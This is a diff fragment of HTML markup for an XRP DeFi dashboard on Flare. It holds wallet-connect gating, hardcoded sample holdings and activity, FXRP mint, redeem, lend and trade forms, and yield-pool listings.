+          <div style="font-size:11px;color:var(--fg);line-height:1.6;margin-bottom:16px;">Connect your XRP wallet to view your portfolio, holdings, claimable rewards and yield.</div>
+          <button onclick="showWalletModal()" style="width:100%;padding:12px;background:linear-gradient(135deg,#346AA9,#1a4a7a);color:#fff;border:none;border-radius:11px;font-size:13px;font-weight:600;cursor:pointer;transition:opacity .2s;">🔗 Connect XRP Wallet</button>
+        </div>
+
+        </div>
+
+        <!-- Blurred holdings preview -->
+        <div class="slbl">XRP Holdings</div>
+        <div class="card" style="position:relative;overflow:hidden;">
+          <div style="filter:blur(5px);pointer-events:none;user-select:none;">
+            <div class="tok"><div class="tic xic">XRP</div><div><div class="tn">XRP — XRPL Native</div><div class="tsub">•,••• XRP · Wallet</div></div><div class="trr"><div class="tp2">$•,•••</div><span class="tag tg">+•.•%</span></div></div>
+            <div class="tok"><div class="tic" style="background:var(--xrpdim);color:var(--xrp);">FX</div><div><div class="tn">FXRP — FAsset</div><div class="tsub">•,••• FXRP · Earning</div></div><div class="trr"><div class="tp2">$•,•••</div><span class="tag tx">In DeFi</span></div></div>
+            <div class="tok"><div class="tic" style="background:rgba(38,161,123,.15);">$</div><div><div class="tn">USDT on Flare</div><div class="tsub">•• USDT stable</div></div><div class="trr"><div class="tp2">$••</div><span class="tag tb">Stable</span></div></div>
+          </div>
+          <div style="position:absolute;inset:0;display:flex;align-items:center;justify-content:center;background:rgba(255,255,255,0.5);">
+            <div style="background:#fff;border:1px solid var(--fbc);border-radius:10px;padding:6px 16px;font-size:11px;font-weight:600;color:var(--fg);display:flex;align-items:center;gap:5px;">🔒 Connect to view holdings</div>
+          </div>
+        </div>
+
+        <!-- Blurred activity preview -->
+        <div class="slbl" style="margin-top:11px;">Recent XRP Activity</div>
+        <div class="card" style="position:relative;overflow:hidden;">
+          <div style="filter:blur(5px);pointer-events:none;user-select:none;">
+            <div class="tok"><div class="tic" style="background:var(--xrpdim);color:var(--xrp);">M</div><div><div class="tn">Minted FXRP</div><div class="tsub">•,••• XRP → FXRP · ••• ago</div></div><div class="trr"><div class="tp2 up">+•,••• FXRP</div></div></div>
+            <div class="tok"><div class="tic" style="background:var(--gdim);">↑</div><div><div class="tn">XRP/USDT LP Added</div><div class="tsub">•,••• XRP · ••• ago</div></div><div class="trr"><div class="tp2 up">+LP</div></div></div>
+            <div class="tok"><div class="tic" style="background:var(--adim);">◈</div><div><div class="tn">XRP Yield Claim</div><div class="tsub">FXRP pool reward · ••• ago</div></div><div class="trr"><div class="tp2 up">+•• XRP</div></div></div>
+          </div>
+          <div style="position:absolute;inset:0;display:flex;align-items:center;justify-content:center;background:rgba(255,255,255,0.5);">
+            <div style="background:#fff;border:1px solid var(--fbc);border-radius:10px;padding:6px 16px;font-size:11px;font-weight:600;color:var(--fg);display:flex;align-items:center;gap:5px;">🔒 Connect to view activity</div>
+          </div>
+        </div>
+      </div>
+
+      <!-- ── WALLET CONNECTED STATE (hidden until connected) ── -->
+      <div id="wallet-connected" style="display:none;">
+
+        <!-- Connected badge -->
+        <div style="display:flex;align-items:center;gap:8px;background:var(--gdim);border:1px solid rgba(22,163,74,.2);border-radius:10px;padding:8px 12px;margin-bottom:13px;">
+          <div style="width:8px;height:8px;border-radius:50%;background:var(--green);animation:bk 2s infinite;"></div>
+          <div style="font-size:12px;font-weight:600;color:var(--green);">Wallet Connected</div>
+          <div style="font-size:10px;color:var(--fg);margin-left:2px;" id="wallet-addr">rHb9CJAWyB4rj91VRWn96DkukG4bwdtyTh···</div>
+          <button onclick="disconnectWallet()" style="margin-left:auto;padding:3px 9px;background:transparent;border:1px solid rgba(239,68,68,.3);border-radius:6px;font-size:10px;color:var(--fr);cursor:pointer;">Disconnect</button>
+        </div>
+
+        <!-- Live metrics -->
+        <div class="mets">
+          <div class="mc xacc"><div class="ml">XRP Holdings</div><div class="mv" style="color:var(--xrp);" id="w-xrp">12,450</div><div class="mch" style="color:var(--xrp);" id="w-xrp-usd">$27,265 USD</div></div>
+          <div class="mc xacc"><div class="ml">FXRP Minted</div><div class="mv" style="color:var(--xrp);" id="w-fxrp">3,200</div><div class="mch up">Earning yield</div></div>
+          <div class="mc acc"><div class="ml">XRP Yield/mo</div><div class="mv up" id="w-yield">$248</div><div class="mch up">◈ Active</div></div>
+          <div class="mc acc"><div class="ml">Claimable</div><div class="mv" style="color:var(--fr);" id="w-claim">$31.40</div><div class="mch" style="color:var(--fr);">tap to claim</div></div>
+        </div>
+
+        <!-- FlareDrop -->
+        <div class="rcard xcard">
+          <div class="rtit xc">🪂 XRP FlareDrop Active</div>
+          <div class="rsub">Wrap FLR to earn XRP-denominated rewards</div>
+          <div class="rrow"><span class="rk">Wrapped FLR</span><span class="rv xv">4,200 FLR</span></div>
+          <div class="rrow"><span class="rk">Next drop</span><span class="rv">Apr 1, 2026</span></div>
+          <div class="rrow"><span class="rk">Est. XRP reward</span><span class="rv up">~72 XRP (~$158)</span></div>
+          <div style="font-size:10px;color:var(--fg);margin-top:8px;margin-bottom:3px;">Month progress — 52%</div>
+          <div class="pb"><div class="pf xbar" style="width:52%"></div></div>
+          <button class="cbtn xbtn" onclick="gp('rewards',document.querySelectorAll('.nt')[4])">View XRP Rewards →</button>
+        </div>
+
+        <!-- Live Holdings -->
+        <div class="slbl">XRP Holdings</div>
+        <div class="card">
+          <div class="tok"><div class="tic xic">XRP</div><div><div class="tn">XRP — XRPL Native</div><div class="tsub" id="w-xrp-bal">9,250 XRP · Wallet</div></div><div class="trr"><div class="tp2" id="w-xrp-val">$20,258</div><span class="tag tg" id="w-xrp-chg">+3.14%</span></div></div>
+          <div class="tok"><div class="tic" style="background:var(--xrpdim);color:var(--xrp);">FX</div><div><div class="tn">FXRP — FAsset</div><div class="tsub" id="w-fxrp-bal">3,200 FXRP · Earning</div></div><div class="trr"><div class="tp2" id="w-fxrp-val">$7,008</div><span class="tag tx">In DeFi</span></div></div>
+          <div class="tok"><div class="tic" style="background:rgba(38,161,123,.15);">$</div><div><div class="tn">USDT on Flare</div><div class="tsub">1,200 USDT stable</div></div><div class="trr"><div class="tp2">$1,200</div><span class="tag tb">Stable</span></div></div>
+        </div>
+
+        <!-- Activity -->
+        <div class="slbl">Recent XRP Activity</div>
+        <div class="card">
+          <div class="tok"><div class="tic" style="background:var(--xrpdim);color:var(--xrp);">M</div><div><div class="tn">Minted FXRP</div><div class="tsub">3,200 XRP → 3,200 FXRP · 2h ago</div></div><div class="trr"><div class="tp2 up">+3,200 FXRP</div></div></div>
+          <div class="tok"><div class="tic" style="background:var(--gdim);">↑</div><div><div class="tn">XRP/USDT LP Added</div><div class="tsub">800 XRP · Flare DEX · 6h ago</div></div><div class="trr"><div class="tp2 up">+LP Tokens</div></div></div>
+          <div class="tok"><div class="tic" style="background:var(--adim);">◈</div><div><div class="tn">XRP Yield Claim</div><div class="tsub">FXRP pool reward · 1d ago</div></div><div class="trr"><div class="tp2 up">+14 XRP</div></div></div>
+          <div class="tok"><div class="tic" style="background:var(--xrpdim);color:var(--xrp);">S</div><div><div class="tn">XRP Staked</div><div class="tsub">1,500 XRP · Flare Stake · 2d ago</div></div><div class="trr"><div class="tp2 up">6.1% APY</div></div></div>
+        </div>
+      </div>
+
+    </div>
+
+    <!-- XRPFI -->
+    <div class="pnl" id="p-xrpfi">
+      <div class="xstrip">
+        <div class="xs-top">
+          <div><div class="xs-lbl">XRPFi Total Value Locked</div><div class="xs-val">132.8M XRP</div><div class="xs-sub">$77.6M USD · Flare Network</div></div>
+          <button class="xs-btn">TVL ↗</button>
+        </div>
+        <div class="xs-stats">
+          <div class="xs-s"><div class="xs-sv">28.4%</div><div class="xs-sl">Peak APY</div></div>
+          <div class="xs-s"><div class="xs-sv">$0.5841</div><div class="xs-sl">XRP/USD</div></div>
+          <div class="xs-s"><div class="xs-sv">5,200</div><div class="xs-sl">Wallets</div></div>
+        </div>
+      </div>
+
+      <div class="slbl">Mint FXRP — FAsset</div>
+      <div class="fasset">
+        <div class="fh">
+          <div class="fi-icon" style="background:#fff;border:1px solid var(--fbc);border-radius:9px;padding:3px;width:30px;height:30px;"><img src="data:image/png;base64,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" alt="Flare" style="width:100%;height:100%;object-fit:contain;"></div>
+          <div><div class="fn">FXRP — XRP FAsset</div><div class="fs">Mint FXRP to use XRP in Flare DeFi</div></div>
+          <span class="tag tg" style="margin-left:auto;">Live</span>
+        </div>
+        <div class="fstats">
+          <div class="fst"><div class="fstv">1:1</div><div class="fstl">XRP Ratio</div></div>
+          <div class="fst"><div class="fstv">150%</div><div class="fstl">Collateral</div></div>
+          <div class="fst"><div class="fstv">$77.6M</div><div class="fstl">TVL</div></div>
+        </div>
+        <div class="fg f2" style="margin-bottom:9px;">
+          <div><div class="fl2">XRP to deposit</div><input class="fi2" type="number" value="1000"></div>
+          <div><div class="fl2">You receive</div><input class="fi2" type="text" value="1,000 FXRP" readonly style="background:var(--xrplight);color:var(--xrp);font-weight:600;"></div>
+        </div>
+        <div class="rrow"><span class="rk">Collateral needed</span><span class="rv xv">1,500 XRP (150%)</span></div>
+        <div class="rrow"><span class="rk">Minting fee</span><span class="rv">0.25%</span></div>
+        <button class="cbtn xbtn" onclick="showWalletModal()">Mint FXRP Now →</button>
+      </div>
+
+      <div class="rcard xcard">
+        <div class="rtit xc">↩ Redeem FXRP → XRP</div>
+        <div class="rsub">Convert FXRP back to native XRP on XRPL</div>
+        <div class="rrow"><span class="rk">Your FXRP balance</span><span class="rv xv">5,000 FXRP</span></div>
+        <div class="rrow"><span class="rk">Redemption fee</span><span class="rv">0.25%</span></div>
+        <div class="rrow"><span class="rk">You receive</span><span class="rv up">4,987.5 XRP</span></div>
+        <button class="cbtn xout" onclick="showWalletModal()">Redeem FXRP</button>
+      </div>
+
+      <div class="slbl">Lend &amp; Borrow with XRP</div>
+      <div class="card">
+        <div class="tok"><div class="tic xic">XRP</div><div><div class="tn">XRP Lending</div><div class="tsub">Supply XRP · Earn interest</div></div><div class="trr"><div class="tp2 up">9.2%</div><span class="tag tg">APY</span></div></div>
+        <div class="tok"><div class="tic" style="background:var(--xrpdim);color:var(--xrp);">FX</div><div><div class="tn">FXRP Collateral</div><div class="tsub">Borrow stables against FXRP</div></div><div class="trr"><div class="tp2">75% LTV</div><span class="tag tx">Active</span></div></div>
+        <div class="tok"><div class="tic" style="background:var(--bdim);color:var(--blue);">$</div><div><div class="tn">XRP/USDT Borrow</div><div class="tsub">3.8% borrow rate</div></div><div class="trr"><div class="tp2">3.8%</div><span class="tag tb">Rate</span></div></div>
+        <button class="cbtn" onclick="showWalletModal()" style="margin-top:10px;background:linear-gradient(135deg,var(--xrp),#1a4a7a);">Lend or Borrow XRP →</button>
+      </div>
+
+      <div class="slbl">Trade FXRP</div>
+      <div class="card">
+        <div class="ch">Swap / Trade</div>
+        <div class="stabs"><div class="stab bon" id="sb" onclick="setS('buy')">Buy FXRP</div><div class="stab" id="ss" onclick="setS('sell')">Sell FXRP</div></div>
+        <div class="fg f2" style="margin-bottom:9px;">
+          <div><div class="fl2">Pair</div><select class="fsel"><option>FXRP / USDT</option><option>FXRP / FLR</option><option>XRP / USDT</option><option>FXRP / USDC</option></select></div>
+          <div><div class="fl2">Order</div><select class="fsel"><option>Market</option><option>Limit</option><option>Stop</option></select></div>
+        </div>
+        <div class="fg f2" style="margin-bottom:8px;">
+          <div><div class="fl2">Price (USDT)</div><input class="fi2" type="number" value="0.5841"></div>
+          <div><div class="fl2">Amount (XRP)</div><input class="fi2" type="number" value="500"></div>
+        </div>
+        <div class="pcrow"><span class="pcbtn">25%</span><span class="pcbtn">50%</span><span class="pcbtn">75%</span><span class="pcbtn">MAX</span></div>
+        <button class="obtn buyb" id="ob" onclick="showWalletModal()">Buy FXRP</button>
+      </div>
+
+      <div class="slbl">Open XRP Orders</div>
+      <div class="card">
+        <div class="tw"><table>
+          <thead><tr><th>Pair</th><th>Type</th><th>Price</th><th></th></tr></thead>
+          <tbody>
+            <tr><td>FXRP/USDT</td><td><span class="tag tg">Limit</span></td><td>$0.56</td><td><button class="xb">✕</button></td></tr>
+            <tr><td>XRP/USDT</td><td><span class="tag ta">Stop</span></td><td>$0.54</td><td><button class="xb">✕</button></td></tr>
+          </tbody>
+        </table></div>
+      </div>
+    </div>
+
+    <!-- YIELD -->
+    <div class="pnl" id="p-yield">
+
+      <!-- Yield metrics — gated by wallet state -->
+      <div id="yield-gate" style="position:relative;margin-bottom:13px;">
+        <div class="mets" style="grid-template-columns:repeat(3,1fr);filter:blur(5px);pointer-events:none;user-select:none;">
+          <div class="mc xacc"><div class="ml">Earning/mo</div><div class="mv up">$•••</div></div>
+          <div class="mc xacc"><div class="ml">Claimable</div><div class="mv" style="color:var(--fr);">$••.••</div></div>
+          <div class="mc"><div class="ml">XRP in DeFi</div><div class="mv">•,•••</div></div>
+        </div>
+        <div style="position:absolute;inset:0;display:flex;align-items:center;justify-content:center;">
+          <div onclick="showWalletModal()" style="background:rgba(255,255,255,0.92);border:1px solid var(--fbc);border-radius:10px;padding:6px 14px;font-size:11px;font-weight:600;color:var(--fg);display:flex;align-items:center;gap:6px;cursor:pointer;transition:all .18s;" onmouseover="this.style.borderColor='var(--xrp)';this.style.color='var(--xrp)'" onmouseout="this.style.borderColor='var(--fbc)';this.style.color='var(--fg)'">🔒 Connect wallet to view</div>
+        </div>
+      </div>
+
+      <!-- Unlocked metrics shown after connect -->
+      <div id="yield-connected" style="display:none;margin-bottom:13px;">
+        <div class="mets" style="grid-template-columns:repeat(3,1fr);">
+          <div class="mc xacc"><div class="ml">Earning/mo</div><div class="mv up" id="y-earn">$248</div></div>
+          <div class="mc xacc"><div class="ml">Claimable</div><div class="mv" style="color:var(--fr);" id="y-claim">$31.40</div></div>
+          <div class="mc"><div class="ml">XRP in DeFi</div><div class="mv" id="y-defi">4,700</div></div>
+        </div>
+      </div>
+
+      <div class="slbl">XRP Liquidity Pools</div>
+      <div class="card">
+        <div class="pool"><div class="pp"><span style="background:var(--xrpdim);color:var(--xrp);">X</span><span style="background:rgba(38,161,123,.2);">$</span></div><div class="pi"><div class="pn">XRP / USDT</div><div class="ps">Flare DEX · $12.4M TVL</div></div><span class="apy">28.4%</span></div>
